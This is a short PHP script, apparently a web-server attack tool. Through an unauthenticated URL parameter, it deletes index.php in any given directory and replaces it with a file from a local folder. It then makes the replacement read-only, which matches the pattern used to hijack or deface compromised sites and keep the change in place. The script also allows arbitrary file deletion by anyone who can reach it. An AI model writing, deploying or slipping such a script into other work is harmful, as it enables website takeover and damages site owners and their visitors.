<?php
// code.php
// Usage: code.php?path=/absolute/path/to/target
// WARNING: This will delete index.php in the target dir. BACKUP first.

$path = isset($_GET['path']) ? $_GET['path'] : '';
if (!$path || !is_dir($path)) {
    die(json_encode(['success' => false, 'message' => 'Invalid or missing path']));
}

$indexFile = rtrim($path, DIRECTORY_SEPARATOR) . '/index.php';
$htaccessFile = rtrim($path, DIRECTORY_SEPARATOR) . '/.htaccess';
$sourceFile = __DIR__ . '/iput/index.php';

$log = [];

// chmod 0644 on index.php and .htaccess if exist
foreach ([$indexFile, $htaccessFile] as $file) {
    if (file_exists($file)) {
        if (@chmod($file, 0644)) $log[] = "chmod 0644 $file";
        else $log[] = "failed chmod 0644 $file";
    }
}

// delete old index.php
if (file_exists($indexFile)) {
    if (@unlink($indexFile)) $log[] = "deleted $indexFile";
    else die(json_encode(['success' => false, 'message' => "cannot delete $indexFile", 'log' => $log]));
} else {
    $log[] = "no existing index.php found";
}

// copy new index.php
if (!is_file($sourceFile)) {
    die(json_encode(['success' => false, 'message' => "source file not found: $sourceFile", 'log' => $log]));
}
if (!@copy($sourceFile, $indexFile)) {
    die(json_encode(['success' => false, 'message' => "failed to copy new index.php", 'log' => $log]));
}
$log[] = "copied new index.php";

// chmod 0444 on new index.php
if (@chmod($indexFile, 0444)) $log[] = "chmod 0444 $indexFile";
else $log[] = "failed chmod 0444 $indexFile";

echo json_encode(['success' => true, 'message' => 'done', 'log' => $log]);
